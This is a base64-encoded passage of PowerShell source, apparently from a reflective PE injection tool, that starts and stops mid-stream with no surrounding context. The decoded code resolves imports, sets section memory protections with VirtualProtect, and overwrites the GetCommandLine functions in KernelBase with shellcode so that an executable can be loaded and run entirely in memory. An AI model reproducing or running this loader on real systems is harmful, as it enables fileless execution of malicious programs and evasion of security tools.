RoIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkTmV3VGh1bmtSZWYsICRUaHVua1JlZiwgJGZhbHNlKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICRUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFRodW5rUmVmKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSkKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kT3JpZ2luYWxUaHVua1JlZikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkpCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kT3JpZ2luYWxUaHVua1JlZlZhbCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRPcmlnaW5hbFRodW5rUmVmLCBbVHlwZV1bSW50UHRyXSkKCiAgICAgICAgICAgICAgICAgICAgI0NsZWFudXAKICAgICAgICAgICAgICAgICAgICAjSWYgbG9hZGluZyBieSBvcmRpbmFsLCBQcm9jZWR1cmVOYW1lUHRyIGlzIHRoZSBvcmRpbmFsIHZhbHVlIGFuZCBub3QgYWN0dWFsbHkgYSBwb2ludGVyIHRvIGEgYnVmZmVyIHRoYXQgbmVlZHMgdG8gYmUgZnJlZWQKICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJExvYWRCeU9yZGluYWwpIC1hbmQgKCRQcm9jZWR1cmVOYW1lUHRyIC1uZSBbSW50UHRyXTo6WmVybykpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkUHJvY2VkdXJlTmFtZVB0cikKICAgICAgICAgICAgICAgICAgICAgICAgJFByb2NlZHVyZU5hbWVQdHIgPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJEltcG9ydERlc2NyaXB0b3JQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJEltcG9ydERlc2NyaXB0b3JQdHIpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IpKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIEZ1bmN0aW9uIEdldC1WaXJ0dWFsUHJvdGVjdFZhbHVlCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbVUludDMyXQogICAgICAgICRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzCiAgICAgICAgKQogICAgICAgIAogICAgICAgICRQcm90ZWN0aW9uRmxhZyA9IDB4MAogICAgICAgIGlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fRVhFQ1VURSkgLWd0IDApCiAgICAgICAgewogICAgICAgICAgICBpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1JFQUQpIC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1dSSVRFKSAtZ3QgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1JFQURXUklURQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9XUklURUNPUFkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9SRUFEKSAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRFdSSVRFCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfUkVBRE9OTFkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fV1JJVEUpIC1ndCAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX1dSSVRFQ09QWQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX05PQUNDRVNTCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9OT1RfQ0FDSEVEKSAtZ3QgMCkKICAgICAgICB7CiAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRQcm90ZWN0aW9uRmxhZyAtYm9yICRXaW4zMkNvbnN0YW50cy5QQUdFX05PQ0FDSEUKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuICRQcm90ZWN0aW9uRmxhZwogICAgfQoKICAgIEZ1bmN0aW9uIFVwZGF0ZS1NZW1vcnlQcm90ZWN0aW9uRmxhZ3MKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRQRUluZm8sCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJGdW5jdGlvbnMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJDb25zdGFudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcwogICAgICAgICkKICAgICAgICAKICAgICAgICBmb3IoICRpID0gMDsgJGkgLWx0ICRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5GaWxlSGVhZGVyLk51bWJlck9mU2VjdGlvbnM7ICRpKyspCiAgICAgICAgewogICAgICAgICAgICBbSW50UHRyXSRTZWN0aW9uSGVhZGVyUHRyID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kUEVJbmZvLlNlY3Rpb25IZWFkZXJQdHIpICgkaSAqIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikpKQogICAgICAgICAgICAkU2VjdGlvbkhlYWRlciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRTZWN0aW9uSGVhZGVyUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9TRUNUSU9OX0hFQURFUikKICAgICAgICAgICAgW0ludFB0cl0kU2VjdGlvblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJFNlY3Rpb25IZWFkZXIuVmlydHVhbEFkZHJlc3MpCiAgICAgICAgICAgIAogICAgICAgICAgICBbVUludDMyXSRQcm90ZWN0RmxhZyA9IEdldC1WaXJ0dWFsUHJvdGVjdFZhbHVlICRTZWN0aW9uSGVhZGVyLkNoYXJhY3RlcmlzdGljcwogICAgICAgICAgICBbVUludDMyXSRTZWN0aW9uU2l6ZSA9ICRTZWN0aW9uSGVhZGVyLlZpcnR1YWxTaXplCiAgICAgICAgICAgIAogICAgICAgICAgICBbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKICAgICAgICAgICAgVGVzdC1NZW1vcnlSYW5nZVZhbGlkIC1EZWJ1Z1N0cmluZyAiVXBkYXRlLU1lbW9yeVByb3RlY3Rpb25GbGFnczo6VmlydHVhbFByb3RlY3QiIC1QRUluZm8gJFBFSW5mbyAtU3RhcnRBZGRyZXNzICRTZWN0aW9uUHRyIC1TaXplICRTZWN0aW9uU2l6ZSB8IE91dC1OdWxsCiAgICAgICAgICAgICRTdWNjZXNzID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkU2VjdGlvblB0ciwgJFNlY3Rpb25TaXplLCAkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKQogICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBjaGFuZ2UgbWVtb3J5IHByb3RlY3Rpb24iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICAKICAgICNUaGlzIGZ1bmN0aW9uIG92ZXJ3cml0ZXMgR2V0Q29tbWFuZExpbmUgYW5kIEV4aXRUaHJlYWQgd2hpY2ggYXJlIG5lZWRlZCB0byByZWZsZWN0aXZlbHkgbG9hZCBhbiBFWEUKICAgICNSZXR1cm5zIGFuIG9iamVjdCB3aXRoIGFkZHJlc3NlcyB0byBjb3BpZXMgb2YgdGhlIGJ5dGVzIHRoYXQgd2VyZSBvdmVyd3JpdHRlbiAoYW5kIHRoZSBjb3VudCkKICAgIEZ1bmN0aW9uIFVwZGF0ZS1FeGVGdW5jdGlvbnMKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRQRUluZm8sCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJGdW5jdGlvbnMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJDb25zdGFudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRFeGVBcmd1bWVudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDQsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRFeGVEb25lQnl0ZVB0cgogICAgICAgICkKICAgICAgICAKICAgICAgICAjVGhpcyB3aWxsIGJlIGFuIGFycmF5IG9mIGFycmF5cy4gVGhlIGlubmVyIGFycmF5IHdpbGwgY29uc2lzdCBvZjogQCgkRGVzdEFkZHIsICRTb3VyY2VBZGRyLCAkQnl0ZUNvdW50KS4gVGhpcyBpcyB1c2VkIHRvIHJldHVybiBtZW1vcnkgdG8gaXRzIG9yaWdpbmFsIHN0YXRlLgogICAgICAgICRSZXR1cm5BcnJheSA9IEAoKSAKICAgICAgICAKICAgICAgICAkUHRyU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkKICAgICAgICBbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKICAgICAgICAKICAgICAgICBbSW50UHRyXSRLZXJuZWwzMkhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRNb2R1bGVIYW5kbGUuSW52b2tlKCJLZXJuZWwzMi5kbGwiKQogICAgICAgIGlmICgkS2VybmVsMzJIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIktlcm5lbDMyIGhhbmRsZSBudWxsIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBbSW50UHRyXSRLZXJuZWxCYXNlSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoIktlcm5lbEJhc2UuZGxsIikKICAgICAgICBpZiAoJEtlcm5lbEJhc2VIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIktlcm5lbEJhc2UgaGFuZGxlIG51bGwiCiAgICAgICAgfQoKICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAgICAgI0ZpcnN0IG92ZXJ3cml0ZSB0aGUgR2V0Q29tbWFuZExpbmUoKSBmdW5jdGlvbi4gVGhpcyBpcyB0aGUgZnVuY3Rpb24gdGhhdCBpcyBjYWxsZWQgYnkgYSBuZXcgcHJvY2VzcyB0byBnZXQgdGhlIGNvbW1hbmQgbGluZSBhcmdzIHVzZWQgdG8gc3RhcnQgaXQuCiAgICAgICAgIyAgIFdlIG92ZXJ3cml0ZSBpdCB3aXRoIHNoZWxsY29kZSB0byByZXR1cm4gYSBwb2ludGVyIHRvIHRoZSBzdHJpbmcgRXhlQXJndW1lbnRzLCBhbGxvd2luZyB1cyB0byBwYXNzIHRoZSBleGUgYW55IGFyZ3Mgd2Ugd2FudC4KICAgICAgICAkQ21kTGluZVdBcmdzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RyaW5nVG9IR2xvYmFsVW5pKCRFeGVBcmd1bWVudHMpCiAgICAgICAgJENtZExpbmVBQXJnc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbEFuc2koJEV4ZUFyZ3VtZW50cykKICAgIAogICAgICAgIFtJbnRQdHJdJEdldENvbW1hbmRMaW5lQUFkZHIgPSAkV2luMzJGdW5jdGlvbnMuR2V0UHJvY0FkZHJlc3MuSW52b2tlKCRLZXJuZWxCYXNlSGFuZGxlLCAiR2V0Q29tbWFuZExpbmVBIikKICAgICAgICBbSW50UHRyXSRHZXRDb21tYW5kTGluZVdBZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkS2VybmVsQmFzZUhhbmRsZSwgIkdldENvbW1hbmRMaW5lVyIpCgogICAgICAgIGlmICgkR2V0Q29tbWFuZExpbmVBQWRkciAtZXEgW0ludFB0cl06Olplcm8gLW9yICRHZXRDb21tYW5kTGluZVdBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIHRocm93ICJHZXRDb21tYW5kTGluZSBwdHIgbnVsbC4gR2V0Q29tbWFuZExpbmVBOiAkKEdldC1IZXggJEdldENvbW1hbmRMaW5lQUFkZHIpLiBHZXRDb21tYW5kTGluZVc6ICQoR2V0LUhleCAkR2V0Q29tbWFuZExpbmVXQWRkcikiCiAgICAgICAgfQoKICAgICAgICAjUHJlcGFyZSB0aGUgc2hlbGxjb2RlCiAgICAgICAgW0J5dGVbXV0kU2hlbGxjb2RlMSA9IEAoKQogICAgICAgIGlmICgkUHRyU2l6ZSAtZXEgOCkKICAgICAgICB7CiAgICAgICAgICAgICRTaGVsbGNvZGUxICs9IDB4NDggIzY0Yml0IHNoZWxsY29kZSBoYXMgdGhlIDB4NDggYmVmb3JlIHRoZSAweGI4CiAgICAgICAgfQogICAgICAgICRTaGVsbGNvZGUxICs9IDB4YjgKICAgICAgICAKICAgICAgICBbQnl0ZVtdXSRTaGVsbGNvZGUyID0gQCgweGMzKQogICAgICAgICRUb3RhbFNpemUgPSAkU2hlbGxjb2RlMS5MZW5ndGggKyAkUHRyU2l6ZSArICRTaGVsbGNvZGUyLkxlbmd0aAogICAgICAgIAogICAgICAgIAogICAgICAgICNNYWtlIGNvcHkgb2YgR2V0Q29tbWFuZExpbmVBIGFuZCBHZXRDb21tYW5kTGluZVcKICAgICAgICAkR2V0Q29tbWFuZExpbmVBT3JpZ0J5dGVzUHRyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb3RhbFNpemUpCiAgICAgICAgJEdldENvbW1hbmRMaW5lV09yaWdCeXRlc1B0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkVG90YWxTaXplKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucy5tZW1jcHkuSW52b2tlKCRHZXRDb21tYW5kTGluZUFPcmlnQnl0ZXNQdHIsICRHZXRDb21tYW5kTGluZUFBZGRyLCBbVUludDY0XSRUb3RhbFNpemUpIHwgT3V0LU51bGwKICAgICAgICAkV2luMzJGdW5jdGlvbnMubWVtY3B5Lkludm9rZSgkR2V0Q29tbWFuZExpbmVXT3JpZ0J5dGVzUHRyLCAkR2V0Q29tbWFuZExpbmVXQWRkciwgW1VJbnQ2NF0kVG90YWxTaXplKSB8IE91dC1OdWxsCiAgICAgICAgJFJldHVybkFycmF5ICs9ICwoJEdldENvbW1hbmRMaW5lQUFkZHIsICRHZXRDb21tYW5kTGluZUFPcmlnQnl0ZXNQdHIsICRUb3RhbFNpemUpCiAgICAgICAgJFJldHVybkFycmF5ICs9ICwoJEdldENvbW1hbmRMaW5lV0FkZHIsICRHZXRDb21tYW5kTGluZVdPcmlnQnl0ZXNQdHIsICRUb3RhbFNpemUpCgogICAgICAgICNPdmVyd3JpdGUgR2V0Q29tbWFuZExpbmVBCiAgICAgICAgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcgPSAwCiAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRHZXRDb21tYW5kTGluZUFBZGRyLCBbVUludDMyXSRUb3RhbFNpemUsIFtVSW50MzJdKCRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKSwgW1JlZl0kT2xkUHJvdGVjdEZsYWcpCiAgICAgICAgaWYgKCRTdWNjZXNzID0gJGZhbHNlKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgIkNhbGwgdG8gVmlydHVhbFByb3RlY3QgZmFpbGVkIgogICAgICAgIH0KICAgICAgICAKICAgICAgICAkR2V0Q29tbWFuZExpbmVBQWRkclRlbXAgPSAkR2V0Q29tbWFuZExpbmVBQWRkcgogICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUxIC1NZW1vcnlBZGRyZXNzICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcAogICAgICAgICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCAoJFNoZWxsY29kZTEuTGVuZ3RoKQogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCRDbWRMaW5lQUFyZ3NQdHIsICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCwgJGZhbHNlKQogICAgICAgICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcCAkUHRyU2l6ZQogICAgICAgIFdyaXRlLUJ5dGVzVG9NZW1vcnkgLUJ5dGVzICRTaGVsbGNvZGUyIC1NZW1vcnlBZGRyZXNzICRHZXRDb21tYW5kTGluZUFBZGRyVGVtcAogICAgICAgIAogICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEdldENvbW1hbmRMaW5lQUFkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0kT2xkUHJvdGVjdEZsYWcsIFtSZWZdJE9sZFByb3RlY3RGbGFnKSB8IE91dC1OdWxsCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI092ZXJ3cml0ZSBHZXRDb21tYW5kTGluZVcKICAgICAgICBbVUludDMyXSRPbGRQcm90ZWN0RmxhZyA9IDAKICAgICAgICAkU3VjY2VzcyA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsUHJvdGVjdC5JbnZva2UoJEdldENvbW1hbmRMaW5lV0FkZHIsIFtVSW50MzJdJFRvdGFsU2l6ZSwgW1VJbnQzMl0oJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpLCBbUmVmXSRPbGRQcm90ZWN0RmxhZykKICAgICAgICBpZiAoJFN1Y2Nlc3MgPSAkZmFsc2UpCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyAiQ2FsbCB0byBWaXJ0dWFsUHJvdGVjdCBmYWlsZWQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgICRHZXRDb21tYW5kTGluZVdBZGRyVGVtcCA9ICRHZXRDb21tYW5kTGluZVdBZGRyCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTEgLU1lbW9yeUFkZHJlc3MgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wCiAgICAgICAgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wICgkU2hlbGxjb2RlMS5MZW5ndGgpCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJENtZExpbmVXQXJnc1B0ciwgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wLCAkZmFsc2UpCiAgICAgICAgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wICRQdHJTaXplCiAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJFNoZWxsY29kZTIgLU1lbW9yeUFkZHJlc3MgJEdldENvbW1hbmRMaW5lV0FkZHJUZW1wCiAgICAgICAgCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxQcm90ZWN0Lkludm9rZSgkR2V0Q29tbWFuZExpbmVXQWRkciwgW1VJbnQzMl0kVG90YWxTaXplLCBbVUludDMyXSRPbGRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpIHwgT3V0LU51bGwKICAgICAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgICAgICNGb3IgQysrIHN0dWZmIHRoYXQgaXMgY29tcGlsZWQgd2l0aCB2aXN1YWwgc3R1ZGlvIGFzICJtdWx0aXRocmVhZGVkIERMTCIsIHRoZSBhYm92ZSBtZXRob2Qgb2Ygb3ZlcndyaXRpbmcgR2V0Q29tbWFuZExpbmUgZG9lc24ndCB3b3JrLgogICAgICAgICMgICBJIGRvbid0IGtub3cgd2h5IGV4YWN0bHkuLiBCdXQgdGhlIG1zdmNyIERMTCB0aGF0IGEgIkRMTCBjb21waWxlZCBleGVjdXRhYmxlIiBpbXBvcnRzIGhhcyBhbiBleHBvcnQgY2FsbGVkIF9hY21kbG4gYW5kIF93Y21kbG4uCiAgICAgICAgIyAgIEl0IGFwcGVhcnMgdG8gY2FsbCBHZXRDb21tYW5kTGluZSBhbmQgc3RvcmUgdGhlIHJlc3VsdCBpbiB0aGlzIHZhci4gVGhlbiB3aGVuIHlvdSBjYWxsIF9fd2dldGNtZGxuIGl0IHBhcnNlcyBhbmQgcmV0dXJucyB0aGUKICAgICAgICAjICAgYXJndiBhbmQgYXJnYyB2YWx1ZXMgc3RvcmVkIGluIHRoZXNlIHZhcmlhYmxlcy4gU28gdGhlIGVhc3kgdGhpbmcgdG8gZG8gaXMganVzdCBvdmVyd3JpdGUgdGhlIHZhcmlhYmxlIHNpbmNlIHRoZXkgYXJlIGV4cG9ydGVkLgogICAgICAgICREbGxMaXN0ID0gQCgibXN2Y3I3MGQuZGxsIiwgIm1zdmNyNzFkLmRsbCIsICJtc3ZjcjgwZC5kbGwiLCAibXN2Y3I5MGQuZGxsIiwgIm1zdmNyMTAwZC5kbGwiLCAibXN2Y3IxMTBkLmRsbCIsICJtc3ZjcjcwLmRsbCIgYAogICAgICAgICAgICAsICJtc3ZjcjcxLmRsbCIsICJtc3ZjcjgwLmRsbCIsICJtc3ZjcjkwLmRsbCIsICJtc3ZjcjEwMC5kbGwiLCAibXN2Y3IxMTAuZGxsIikKICAgICAgICAKICAgICAgICBmb3JlYWNoICgkRGxsIGluICREbGxMaXN0KQogICAgICAgIHsKICAgICAgICAgICAgW0ludFB0cl0kRGxsSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoJERsbCkKICAgICAgICAgICAgaWYgKCREbGxIYW5kbGUgLW5lIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBbSW50UHRyXSRXQ21kTG5BZGRyID0gJFdpbjMyRnVuY3Rpb25zLkdldFByb2NBZGRyZXNzLkludm9rZSgkRGxsSGFuZGxlLCAiX